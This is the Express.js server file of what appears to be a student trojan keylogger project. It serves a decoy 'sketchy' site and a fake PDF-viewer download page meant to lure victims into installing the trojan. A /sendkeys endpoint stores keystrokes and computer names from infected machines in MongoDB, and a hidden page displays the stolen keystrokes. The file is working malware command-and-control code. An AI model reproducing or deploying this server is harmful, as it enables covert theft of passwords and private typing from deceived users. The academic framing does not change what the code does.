/**
 * Author: Keven McDowell
 * Project: CSC 590 Trojan Keylogger
 * Description: Main server file for the webserver that receives data from the keylogger.
 */


 // Requiring all modules needed for the server.
const express = require("express"),
  app = express(),
  bodyParser = require("body-parser"),
  keyloggerService = require("./services/keyLoggerService");

// Setting the server up to serve pug templates and parse json automatically.
app.set("view engine", "pug");
app.set("views", "./pug");
app.use(express.static("resources")); // Allows us to statically server images and other files.
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

/**
 * Endpoint: /pdfpage
 * Serves the page that the user is supposed to download the trojan from.
 */
app.get("/pdfpage", (req, res) => {
  res.render("pdfpage.pug");
});

/**
 * Endpoint: /hiddenkeylogger
 * Serves the page that displays all of the current keystrokes received from the keylogger.
 */
app.get("/hiddenkeylogger", (req, res) => {
  res.render("keyloggerpage");
});

/**
 * Endpoint: /getAllKeys
 * API Endpoint that contacts the database and queries all keystrokes and returns them 
 * in the response.
 */
app.get("/getAllKeys", (req, res) => {
  keyloggerService.getAllStrokes().then(resp => {
    res.json(resp);
  }).catch(e => {
    res.sendStatus(500);
  });
});

/**
 * Endpoint: /sendKeys
 * API Endpoint that the keylogger hits to send keystrokes. Then contacts service layer,
 * which then contacts the database and stores the keystrokes.
 */
app.post("/sendkeys", (req, res) => {
  try {
    const saveObj = {
      computerName: req.body.computerName,
      keystrokes: req.body.keystrokes,
      timestamp: new Date()
    };
    keyloggerService.saveKeystrokes(saveObj);
    res.sendStatus(200);
  } catch(e) {
    res.sendStatus(500);
  }
});
/**
 * Endpoint: /searchKeys
 * API Endpoint that allows us to search keystrokes based on the computer name.
 */
app.post("/searchKeys", (req, res) => {

});

/**
 * Endpoint: "/"
 *  Serves as the joke page that would represent some sketchy site you would visit. The site would 
 *  theoretically contain advertisements that were sketchy, which commonly includes an advert for a pdf viewer.
 *  User then clicks on advert and downloads the fake file that runs the virus when executed.
 */
app.get("/", (req, res) => {
  res.render("dummypage");
});

/**
 * Server listen:
 * Makes the server listen on port 8080. Connects to the MongoDB instance whenever
 * the server finishes starting up.
 */
app.listen(8080, () => {
  keyloggerService.connectDB();
  console.log("server started");
});

//ajdl;kasdflksdf
